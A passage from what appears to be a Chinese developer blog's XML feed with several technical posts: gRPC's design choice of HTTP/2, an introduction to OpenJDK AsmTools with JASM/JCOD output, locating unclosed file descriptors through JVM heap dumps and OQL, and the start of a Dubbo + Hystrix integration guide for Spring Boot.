<h4 id="HTTP-2-天然支持物联网、手机、浏览器"><a href="#HTTP-2-天然支持物联网、手机、浏览器" class="headerlink" title="HTTP/2 天然支持物联网、手机、浏览器"></a>HTTP/2 天然支持物联网、手机、浏览器</h4><p>实际上先用上HTTP/2的也是手机和手机浏览器。移动互联网推动了HTTP/2的发展和普及。</p>
<h3 id="基于HTTP-2-多语言客户端实现容易"><a href="#基于HTTP-2-多语言客户端实现容易" class="headerlink" title="基于HTTP/2 多语言客户端实现容易"></a>基于HTTP/2 多语言客户端实现容易</h3><p>只讨论协议本身的实现，不考虑序列化。</p>
<ul>
<li>每个流行的编程语言都会有成熟的HTTP/2 Client</li>
<li>HTTP/2 Client是经过充分测试，可靠的</li>
<li>用Client发送HTTP/2请求的难度远低于用socket发送数据包/解析数据包</li>
</ul>
<h4 id="HTTP-2支持Stream和流控"><a href="#HTTP-2支持Stream和流控" class="headerlink" title="HTTP/2支持Stream和流控"></a>HTTP/2支持Stream和流控</h4><p>在业界，有很多支持stream的方案，比如基于websocket的，或者<a href="https://github.com/rsocket/rsocket" target="_blank" rel="noopener">rsocket</a>。但是这些方案都不是通用的。</p>
<p>HTTP/2里的Stream还可以设置优先级，尽管在rpc里可能用的比较少，但是一些复杂的场景可能会用到。</p>
<h4 id="基于HTTP-2-在Gateway-Proxy很容易支持"><a href="#基于HTTP-2-在Gateway-Proxy很容易支持" class="headerlink" title="基于HTTP/2 在Gateway/Proxy很容易支持"></a>基于HTTP/2 在Gateway/Proxy很容易支持</h4><ul>
<li>nginx对gRPC的支持：<a href="https://www.nginx.com/blog/nginx-1-13-10-grpc/" target="_blank" rel="noopener">https://www.nginx.com/blog/nginx-1-13-10-grpc/</a></li>
<li>envoy对gRPC的支持：<a href="https://www.envoyproxy.io/docs/envoy/latest/intro/arch_overview/grpc#" target="_blank" rel="noopener">https://www.envoyproxy.io/docs/envoy/latest/intro/arch_overview/grpc#</a></li>
</ul>
<h4 id="HTTP-2-安全性有保证"><a href="#HTTP-2-安全性有保证" class="headerlink" title="HTTP/2 安全性有保证"></a>HTTP/2 安全性有保证</h4><ul>
<li>HTTP/2 天然支持SSL，当然gRPC可以跑在clear text协议（即不加密）上。 </li>
<li>很多私有协议的rpc可能自己包装了一层TLS支持，使用起来也非常复杂。开发者是否有足够的安全知识？使用者是否配置对了？运维者是否能正确理解？</li>
<li>HTTP/2 在公有网络上的传输上有保证。比如这个<a href="https://en.wikipedia.org/wiki/CRIME" target="_blank" rel="noopener">CRIME攻击</a>，私有协议很难保证没有这样子的漏洞。</li>
</ul>
<h4 id="HTTP-2-鉴权成熟"><a href="#HTTP-2-鉴权成熟" class="headerlink" title="HTTP/2 鉴权成熟"></a>HTTP/2 鉴权成熟</h4><ul>
<li>从HTTP/1发展起来的鉴权系统已经很成熟了，可以无缝用在HTTP/2上</li>
<li>可以从前端到后端完全打通的鉴权，不需要做任何转换适配</li>
</ul>
<p>比如传统的rpc dubbo，需要写一个dubbo filter，还要考虑把鉴权相关的信息通过thread local传递进去。rpc协议本身也需要支持。总之，非常复杂。实际上绝大部分公司里的rpc都是没有鉴权的，可以随便调。</p>
<h3 id="基于HTTP-2-的缺点"><a href="#基于HTTP-2-的缺点" class="headerlink" title="基于HTTP/2 的缺点"></a>基于HTTP/2 的缺点</h3><ul>
<li><p>rpc的元数据的传输不够高效</p>
<p>  尽管HPAC可以压缩HTTP Header，但是对于rpc来说，确定一个函数调用，可以简化为一个int，只要两端去协商过一次，后面直接查表就可以了，不需要像HPAC那样编码解码。<br>  可以考虑专门对gRPC做一个优化过的HTTP/2解析器，减少一些通用的处理，感觉可以提升性能。</p>
</li>
<li><p>HTTP/2 里一次gRPC调用需要解码两次</p>
<p>  一次是HEADERS frame，一次是DATA frame。</p>
</li>
<li><p>HTTP/2 标准本身是只有一个TCP连接，但是实际在gRPC里是会有多个TCP连接，使用时需要注意。</p>
</li>
</ul>
<p>gRPC选择基于HTTP/2，那么它的性能肯定不会是最顶尖的。但是对于rpc来说中庸的qps可以接受，通用和兼容性才是最重要的事情。</p>
<ul>
<li>官方的benchmark：<a href="https://grpc.io/docs/guides/benchmarking.html" target="_blank" rel="noopener">https://grpc.io/docs/guides/benchmarking.html</a></li>
<li><a href="https://github.com/hank-whu/rpc-benchmark" target="_blank" rel="noopener">https://github.com/hank-whu/rpc-benchmark</a> </li>
</ul>
<h3 id="Google制定标准的能力"><a href="#Google制定标准的能力" class="headerlink" title="Google制定标准的能力"></a>Google制定标准的能力</h3><p>近10年来，Google制定标准的能力越来越强。下面列举一些标准：</p>
<ul>
<li>HTTP/2</li>
<li>WebP图片格式</li>
<li>WebRTC 网页即时通信</li>
<li>VP9/AV1 视频编码标准</li>
<li>Service Worker/PWA</li>
</ul>
<p>当然google也并不都会成功，很多事情它想推也失败了，比如Chrome的Native Client。</p>
<p><strong>gRPC目前是k8s生态里的事实标准。 gRPC是否会成为更多地方，更大领域的RPC标准？</strong></p>
<h3 id="为什么会出现gRPC"><a href="#为什么会出现gRPC" class="headerlink" title="为什么会出现gRPC"></a>为什么会出现gRPC</h3><p>准确来说为什么会出现基于HTTP/2的RPC？</p>
<p>个人认为一个重要的原因是，在Cloud Native的潮流下，开放互通的需求必然会产生基于HTTP/2的RPC。即使没有gRPC，也会有其它基于HTTP/2的RPC。</p>
<p>gRPC在Google的内部也是先用在Google Cloud Platform和公开的API上：<a href="https://opensource.google.com/projects/grpc" target="_blank" rel="noopener">https://opensource.google.com/projects/grpc</a></p>
<p>尽管gRPC它可能替换不了内部的RPC实现，但是在开放互通的时代，不止在k8s上，gRPC会有越来越多的舞台可以施展。</p>
<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><ul>
<li><a href="https://hpbn.co/" target="_blank" rel="noopener">https://hpbn.co/</a></li>
<li><a href="https://grpc.io/blog/loadbalancing" target="_blank" rel="noopener">https://grpc.io/blog/loadbalancing</a></li>
<li><a href="https://http2.github.io/faq" target="_blank" rel="noopener">https://http2.github.io/faq</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>rpc</tag>
        <tag>http2</tag>
        <tag>grpc</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenJDK里的AsmTools简介</title>
    <url>/openjdk-asmtools/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
<li><a href="https://wiki.openjdk.java.net/display/CodeTools/asmtools" target="_blank" rel="noopener">https://wiki.openjdk.java.net/display/CodeTools/asmtools</a> </li>
</ul>
<p>在OpenJDK里有一个<code>AsmTools</code>项目，用来生成正确的或者不正确的java <code>.class</code>文件，主要用来测试和验证。</p>
<p>我们知道直接修改<code>.class</code>文件是很麻烦的，虽然有一些图形界面的工具，但还是很麻烦。</p>
<p>以前我的办法是用<a href="https://static.javadoc.io/org.ow2.asm/asm/5.2/org/objectweb/asm/util/ASMifier.html" target="_blank" rel="noopener">ASMifier</a>从<code>.class</code>文件生成asm java代码，再修改代码，生成新的<code>.class</code>文件，非常麻烦。</p>
<p><code>AsmTools</code>引入了两种表示<code>.class</code>文件的语法：</p>
<ul>
<li><p>JASM</p>
<p>  用类似java本身的语法来定义类和函数，字节码指令则很像传统的汇编。</p>
</li>
<li><p>JCOD </p>
<p>  整个<code>.class</code>用容器的方式来表示，可以很清楚表示类文件的结构。</p>
</li>
</ul>
<p>重要的是两种语法的文件都是可以和<code>.class</code>互相转换的。</p>
<h2 id="构建AsmTools"><a href="#构建AsmTools" class="headerlink" title="构建AsmTools"></a>构建AsmTools</h2><p>官方文档： <a href="https://wiki.openjdk.java.net/display/CodeTools/How+to+build+AsmTools" target="_blank" rel="noopener">https://wiki.openjdk.java.net/display/CodeTools/How+to+build+AsmTools</a> </p>
<p>需要有jdk8和ant。</p>
<ol>
<li><p>clone代码</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hg clone http://hg.openjdk.java.net/code-tools/asmtools</span><br></pre></td></tr></table></figure>
</li>
<li><p>编绎</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd asmtools/build</span><br><span class="line">ant</span><br></pre></td></tr></table></figure>
<p> 打包出来的zip包里有一个<code>asmtools.jar</code>。</p>
</li>
</ol>
<p>也可以在这里下载我构建的：<a href="https://github.com/hengyunabc/hengyunabc.github.io/files/2188258/asmtools-7.0.zip" target="_blank" rel="noopener">https://github.com/hengyunabc/hengyunabc.github.io/files/2188258/asmtools-7.0.zip</a></p>
<h2 id="测试简单的java类"><a href="#测试简单的java类" class="headerlink" title="测试简单的java类"></a>测试简单的java类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"hello"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先用javac来编绎： </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javac Test.java</span><br></pre></td></tr></table></figure>
<h3 id="查看JASM语法结果"><a href="#查看JASM语法结果" class="headerlink" title="查看JASM语法结果"></a>查看JASM语法结果</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar asmtools.jar jdis Test.class</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">super public class Test</span><br><span class="line">	version 52:0</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public Method &quot;&lt;init&gt;&quot;:&quot;()V&quot;</span><br><span class="line">	stack 1 locals 1</span><br><span class="line">&#123;</span><br><span class="line">		aload_0;</span><br><span class="line">		invokespecial	Method java/lang/Object.&quot;&lt;init&gt;&quot;:&quot;()V&quot;;</span><br><span class="line">		return;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static Method main:&quot;([Ljava/lang/String;)V&quot;</span><br><span class="line">	stack 2 locals 1</span><br><span class="line">&#123;</span><br><span class="line">		getstatic	Field java/lang/System.out:&quot;Ljava/io/PrintStream;&quot;;</span><br><span class="line">		ldc	String &quot;hello&quot;;</span><br><span class="line">		invokevirtual	Method java/io/PrintStream.println:&quot;(Ljava/lang/String;)V&quot;;</span><br><span class="line">		return;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; // end Class Test</span><br></pre></td></tr></table></figure>
<h3 id="查看JCOD语法结果"><a href="#查看JCOD语法结果" class="headerlink" title="查看JCOD语法结果"></a>查看JCOD语法结果</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar asmtools.jar jdec Test.class</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Test &#123;</span><br><span class="line">  0xCAFEBABE;</span><br><span class="line">  0; // minor version</span><br><span class="line">  52; // version</span><br><span class="line">  [] &#123; // Constant Pool</span><br><span class="line">    ; // first element is empty</span><br><span class="line">    class #2; // #1</span><br><span class="line">    Utf8 &quot;Test&quot;; // #2</span><br><span class="line">    class #4; // #3</span><br><span class="line">    Utf8 &quot;java/lang/Object&quot;; // #4</span><br><span class="line">    Utf8 &quot;&lt;init&gt;&quot;; // #5</span><br><span class="line">    Utf8 &quot;()V&quot;; // #6</span><br><span class="line">    Utf8 &quot;Code&quot;; // #7</span><br><span class="line">    Method #3 #9; // #8</span><br><span class="line">    NameAndType #5 #6; // #9</span><br><span class="line">    Utf8 &quot;LineNumberTable&quot;; // #10</span><br><span class="line">    Utf8 &quot;LocalVariableTable&quot;; // #11</span><br><span class="line">    Utf8 &quot;this&quot;; // #12</span><br><span class="line">    Utf8 &quot;LTest;&quot;; // #13</span><br><span class="line">    Utf8 &quot;main&quot;; // #14</span><br><span class="line">    Utf8 &quot;([Ljava/lang/String;)V&quot;; // #15</span><br><span class="line">    Field #17 #19; // #16</span><br><span class="line">    class #18; // #17</span><br><span class="line">    Utf8 &quot;java/lang/System&quot;; // #18</span><br><span class="line">    NameAndType #20 #21; // #19</span><br><span class="line">    Utf8 &quot;out&quot;; // #20</span><br><span class="line">    Utf8 &quot;Ljava/io/PrintStream;&quot;; // #21</span><br><span class="line">    String #23; // #22</span><br><span class="line">    Utf8 &quot;hello&quot;; // #23</span><br><span class="line">    Method #25 #27; // #24</span><br><span class="line">    class #26; // #25</span><br><span class="line">    Utf8 &quot;java/io/PrintStream&quot;; // #26</span><br><span class="line">    NameAndType #28 #29; // #27</span><br><span class="line">    Utf8 &quot;println&quot;; // #28</span><br><span class="line">    Utf8 &quot;(Ljava/lang/String;)V&quot;; // #29</span><br><span class="line">    Utf8 &quot;args&quot;; // #30</span><br><span class="line">    Utf8 &quot;[Ljava/lang/String;&quot;; // #31</span><br><span class="line">    Utf8 &quot;SourceFile&quot;; // #32</span><br><span class="line">    Utf8 &quot;Test.java&quot;; // #33</span><br><span class="line">  &#125; // Constant Pool</span><br><span class="line"></span><br><span class="line">  0x0021; // access</span><br><span class="line">  #1;// this_cpx</span><br><span class="line">  #3;// super_cpx</span><br><span class="line"></span><br><span class="line">  [] &#123; // Interfaces</span><br><span class="line">  &#125; // Interfaces</span><br><span class="line"></span><br><span class="line">  [] &#123; // fields</span><br><span class="line">  &#125; // fields</span><br><span class="line"></span><br><span class="line">  [] &#123; // methods</span><br><span class="line">    &#123; // Member</span><br><span class="line">      0x0001; // access</span><br><span class="line">      #5; // name_cpx</span><br><span class="line">      #6; // sig_cpx</span><br><span class="line">      [] &#123; // Attributes</span><br><span class="line">        Attr(#7) &#123; // Code</span><br><span class="line">          1; // max_stack</span><br><span class="line">          1; // max_locals</span><br><span class="line">          Bytes[]&#123;</span><br><span class="line">            0x2AB70008B1;</span><br><span class="line">          &#125;</span><br><span class="line">          [] &#123; // Traps</span><br><span class="line">          &#125; // end Traps</span><br><span class="line">          [] &#123; // Attributes</span><br><span class="line">            Attr(#10) &#123; // LineNumberTable</span><br><span class="line">              [] &#123; // LineNumberTable</span><br><span class="line">                0  2;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125; // end LineNumberTable</span><br><span class="line">            ;</span><br><span class="line">            Attr(#11) &#123; // LocalVariableTable</span><br><span class="line">              [] &#123; // LocalVariableTable</span><br><span class="line">                0 5 12 13 0;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125; // end LocalVariableTable</span><br><span class="line">          &#125; // Attributes</span><br><span class="line">        &#125; // end Code</span><br><span class="line">      &#125; // Attributes</span><br><span class="line">    &#125; // Member</span><br><span class="line">    ;</span><br><span class="line">    &#123; // Member</span><br><span class="line">      0x0009; // access</span><br><span class="line">      #14; // name_cpx</span><br><span class="line">      #15; // sig_cpx</span><br><span class="line">      [] &#123; // Attributes</span><br><span class="line">        Attr(#7) &#123; // Code</span><br><span class="line">          2; // max_stack</span><br><span class="line">          1; // max_locals</span><br><span class="line">          Bytes[]&#123;</span><br><span class="line">            0xB200101216B60018;</span><br><span class="line">            0xB1;</span><br><span class="line">          &#125;</span><br><span class="line">          [] &#123; // Traps</span><br><span class="line">          &#125; // end Traps</span><br><span class="line">          [] &#123; // Attributes</span><br><span class="line">            Attr(#10) &#123; // LineNumberTable</span><br><span class="line">              [] &#123; // LineNumberTable</span><br><span class="line">                0  5;</span><br><span class="line">                8  6;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125; // end LineNumberTable</span><br><span class="line">            ;</span><br><span class="line">            Attr(#11) &#123; // LocalVariableTable</span><br><span class="line">              [] &#123; // LocalVariableTable</span><br><span class="line">                0 9 30 31 0;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125; // end LocalVariableTable</span><br><span class="line">          &#125; // Attributes</span><br><span class="line">        &#125; // end Code</span><br><span class="line">      &#125; // Attributes</span><br><span class="line">    &#125; // Member</span><br><span class="line">  &#125; // methods</span><br><span class="line"></span><br><span class="line">  [] &#123; // Attributes</span><br><span class="line">    Attr(#32) &#123; // SourceFile</span><br><span class="line">      #33;</span><br><span class="line">    &#125; // end SourceFile</span><br><span class="line">  &#125; // Attributes</span><br><span class="line">&#125; // end class Test</span><br></pre></td></tr></table></figure>
<h2 id="从JASM-JCOD语法文件生成类文件"><a href="#从JASM-JCOD语法文件生成类文件" class="headerlink" title="从JASM/JCOD语法文件生成类文件"></a>从JASM/JCOD语法文件生成类文件</h2><p>因为是等价表达，可以从JASM生成<code>.class</code>文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar asmtools.jar jasm Test.jasm</span><br></pre></td></tr></table></figure>
<p>同样可以从JCOD生成<code>.class</code>文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar asmtools.jar jcoder Test.jasm</span><br></pre></td></tr></table></figure>
<p>更多使用方法参考： <a href="https://wiki.openjdk.java.net/display/CodeTools/Chapter+2#Chapter2-Jasm.1" target="_blank" rel="noopener">https://wiki.openjdk.java.net/display/CodeTools/Chapter+2#Chapter2-Jasm.1</a></p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><ul>
<li><p><a href="https://wiki.openjdk.java.net/display/CodeTools/Appendix+A" target="_blank" rel="noopener">https://wiki.openjdk.java.net/display/CodeTools/Appendix+A</a> JASM Syntax</p>
</li>
<li><p><a href="https://wiki.openjdk.java.net/display/CodeTools/Appendix+B" target="_blank" rel="noopener">https://wiki.openjdk.java.net/display/CodeTools/Appendix+B</a> JCOD Syntax</p>
</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>jvm</tag>
        <tag>asm</tag>
      </tags>
  </entry>
  <entry>
    <title>从JVM heap dump里查找没有关闭文件的引用</title>
    <url>/jvm-heap-dump-find-fd/</url>
    <content><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>最近排查一个文件没有关闭的问题，记录一下。</p>
<p>哪些文件没有关闭是比较容易找到的，查看进程的fd(File Descriptor)就可以。但是确定fd是在哪里被打开，在哪里被引用的就复杂点，特别是在没有重启应用的情况下。<br>在JVM里可以通过heap dump比较方便地反查对象的引用，从而找到泄露的代码。</p>
<p>以下面简单的demo为例，Demo会创建一个临时文件，并且没有close掉：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">		File tempFile = File.createTempFile(<span class="string">"test"</span>, <span class="string">"ttt"</span>);</span><br><span class="line">		FileInputStream fi = <span class="keyword">new</span> FileInputStream(tempFile);</span><br><span class="line"></span><br><span class="line">		System.in.read();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="通过文件名查找对应的fd"><a href="#通过文件名查找对应的fd" class="headerlink" title="通过文件名查找对应的fd"></a>通过文件名查找对应的fd</h3><p>进程打开的文件在OS里有对应的fd(File Descriptor)，可以用lsof命令或者直接在linux下到<code>/proc</code>目录下查看。</p>
<p>以demo为例，可以找到test文件的fd是12：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ls -alh /proc/11278/fd/</span><br><span class="line">total 0</span><br><span class="line">dr-x------ 2 admin users  0 Jun 30 18:20 .</span><br><span class="line">dr-xr-xr-x 8 admin users  0 Jun 30 18:20 ..</span><br><span class="line">lrwx------ 1 admin users 64 Jun 30 18:20 0 -&gt; /dev/pts/0</span><br><span class="line">lrwx------ 1 admin users 64 Jun 30 18:20 1 -&gt; /dev/pts/0</span><br><span class="line">lr-x------ 1 admin users 64 Jun 30 18:24 11 -&gt; /dev/urandom</span><br><span class="line">lr-x------ 1 admin users 64 Jun 30 18:24 12 -&gt; /tmp/test7607712940880692142ttt</span><br></pre></td></tr></table></figure>
<h3 id="对进程进行heap-dump"><a href="#对进程进行heap-dump" class="headerlink" title="对进程进行heap dump"></a>对进程进行heap dump</h3><p>使用jmap命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jmap -dump:live,format=b,file=heap.bin 11278</span><br></pre></td></tr></table></figure>
<h3 id="通过OQL查询java-io-FileDescriptor对象"><a href="#通过OQL查询java-io-FileDescriptor对象" class="headerlink" title="通过OQL查询java.io.FileDescriptor对象"></a>通过OQL查询<code>java.io.FileDescriptor</code>对象</h3><p>对于每一个打开的文件在JVM里都有一个<code>java.io.FileDescriptor</code>对象。查看下源码，可以发现<code>FileDescriptor</code>里有一个<code>fd</code>字段：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">FileDescriptor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> fd;</span><br></pre></td></tr></table></figure>
<p>所以需要查找到fd等于12的<code>FileDescriptor</code>，QOL语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select s from java.io.FileDescriptor s where s.fd == 12</span><br></pre></td></tr></table></figure>
<h4 id="使用VisualVM里的OQL控制台查询"><a href="#使用VisualVM里的OQL控制台查询" class="headerlink" title="使用VisualVM里的OQL控制台查询"></a>使用VisualVM里的OQL控制台查询</h4><p>在jdk8里自带VisualVM，jdk9之后可以单独下载：<a href="https://visualvm.github.io/" target="_blank" rel="noopener">https://visualvm.github.io/</a></p>
<p>把heap dump文件导入VisualVM里，然后在“OQL控制台”查询上面的语句，结果是：</p>
<p><img src="/img/visualvm-query.png" alt="visualvm-query"></p>
<p>再可以查询到parent，引用相关的对象。</p>
<p><img src="/img/visualvm-object.png" alt="visualvm-object"></p>
<h4 id="使用jhat查询"><a href="#使用jhat查询" class="headerlink" title="使用jhat查询"></a>使用jhat查询</h4><p>除了VisualVM还有其它很多heap dump工具，在jdk里还自带一个jhat工具，尽管在jdk9之后移除掉了，但是个人还是比较喜欢这个工具，因为它是一个web接口的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jhat -port 7000 heap.bin</span><br></pre></td></tr></table></figure>
<p>访问 <a href="http://localhost:7000/oql/" target="_blank" rel="noopener">http://localhost:7000/oql/</a> ，可以在浏览器里查询OQL：</p>
<p><img src="/img/jhat-query.png" alt="jhat-query"></p>
<p>打开链接可以查看具体的信息</p>
<p><img src="/img/jhat-object.png" alt="jhat-object"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li>先找出没有关闭文件的fd</li>
<li>从heap dump里据fd找出对应的<code>java.io.FileDescriptor</code>对象，再找到相关引用</li>
</ul>
<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><ul>
<li><a href="https://visualvm.github.io/" target="_blank" rel="noopener">ViauslVM</a></li>
<li><a href="http://cr.openjdk.java.net/~sundar/8022483/webrev.01/raw_files/new/src/share/classes/com/sun/tools/hat/resources/oqlhelp.html" target="_blank" rel="noopener">Object Query Language (OQL)</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>jvm</tag>
        <tag>fd</tag>
        <tag>visualvm</tag>
      </tags>
  </entry>
  <entry>
    <title>深入Spring Boot：快速集成Dubbo + Hystrix</title>
    <url>/spring-boot-dubbo-hystrix/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Hystrix 旨在通过控制那些访问远程系统、服务和第三方库的节点，从而对延迟和故障提供更强大的容错能力。Hystrix具备拥有回退机制和断路器功能的线程和信号隔离，请求缓存和请求打包，以及监控和配置等功能。</p>
<p>Dubbo是Alibaba开源的，目前国内最流行的java rpc框架。</p>
<p>本文介绍在spring应用里，怎么把Dubbo和Hystrix结合起来使用。</p>
<ul>
<li><a href="https://github.com/Netflix/Hystrix" target="_blank" rel="noopener">https://github.com/Netflix/Hystrix</a></li>
<li><a href="https://github.com/apache/incubator-dubbo" target="_blank" rel="noopener">https://github.com/apache/incubator-dubbo</a></li>
</ul>
<h2 id="Spring-Boot应用"><a href="#Spring-Boot应用" class="headerlink" title="Spring Boot应用"></a>Spring Boot应用</h2><p>Demo地址： <a href="https://github.com/dubbo/dubbo-samples/tree/master/dubbo-samples-spring-boot-hystrix" target="_blank" rel="noopener">https://github.com/dubbo/dubbo-samples/tree/master/dubbo-samples-spring-boot-hystrix</a></p>
<h3 id="生成dubbo集成spring-boot的应用"><a href="#生成dubbo集成spring-boot的应用" class="headerlink" title="生成dubbo集成spring boot的应用"></a>生成dubbo集成spring boot的应用</h3><p>对于不熟悉dubbo 集成spring boot应用的同学，可以在这里直接生成dubbo + spring boot的工程： <a href="http://start.dubbo.io/" target="_blank" rel="noopener">http://start.dubbo.io/</a></p>
<h3 id="配置spring-cloud-starter-netflix-hystrix"><a href="#配置spring-cloud-starter-netflix-hystrix" class="headerlink" title="配置spring-cloud-starter-netflix-hystrix"></a>配置spring-cloud-starter-netflix-hystrix</h3><p>spring boot官方提供了对hystrix的集成，直接在pom.xml里加入依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-hystrix<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后在Application类上增加<code>@EnableHystrix</code>来启用hystrix starter：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableHystrix</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProviderApplication</span> </span>&#123;</span><br></pre></td></tr></table></figure>
<h3 id="配置Provider端"><a href="#配置Provider端" class="headerlink" title="配置Provider端"></a>配置Provider端</h3><p>在Dubbo的Provider上增加<code>@HystrixCommand</code>配置，这样子调用就会经过Hystrix代理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span>(version = <span class="string">"1.0.0"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServiceImpl</span> <span class="keyword">implements</span> <span class="title">HelloService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@HystrixCommand</span>(commandProperties = &#123;</span><br><span class="line">                    <span class="meta">@HystrixProperty</span>(name = <span class="string">"circuitBreaker.requestVolumeThreshold"</span>, value = <span class="string">"10"</span>),</span><br><span class="line">                    <span class="meta">@HystrixProperty</span>(name = <span class="string">"execution.isolation.thread.timeoutInMilliseconds"</span>, value = <span class="string">"2000"</span>) &#125;)</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// System.out.println("async provider received: " + name);</span></span><br><span class="line">        <span class="comment">// return "annotation: hello, " + name;</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"Exception to show hystrix enabled."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="配置Consumer端"><a href="#配置Consumer端" class="headerlink" title="配置Consumer端"></a>配置Consumer端</h3><p>对于Consumer端，则可以增加一层method调用，并在method上配置<code>@HystrixCommand</code>。当调用出错时，会走到<code>fallbackMethod = &quot;reliable&quot;</code>的调用里。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Reference</span>(version = <span class="string">"1.0.0"</span>)</span><br><span class="line"><span class="keyword">private</span> HelloService demoService;</span><br><span class="line"></span><br><span class="line"><span class="meta">@HystrixCommand</span>(fallbackMethod = <span class="string">"reliable"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">doSayHello</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> demoService.sayHello(name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">reliable</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"hystrix fallback value"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过上面的配置，很简单地就完成了Spring Boot里Dubbo + Hystrix的集成。</p>
<h2 id="传统Spring-Annotation应用"><a href="#传统Spring-Annotation应用" class="headerlink" title="传统Spring Annotation应用"></a>传统Spring Annotation应用</h2><p>Demo地址： <a href="https://github.com/dubbo/dubbo-samples/tree/master/dubbo-samples-spring-hystrix" target="_blank" rel="noopener">https://github.com/dubbo/dubbo-samples/tree/master/dubbo-samples-spring-hystrix</a></p>
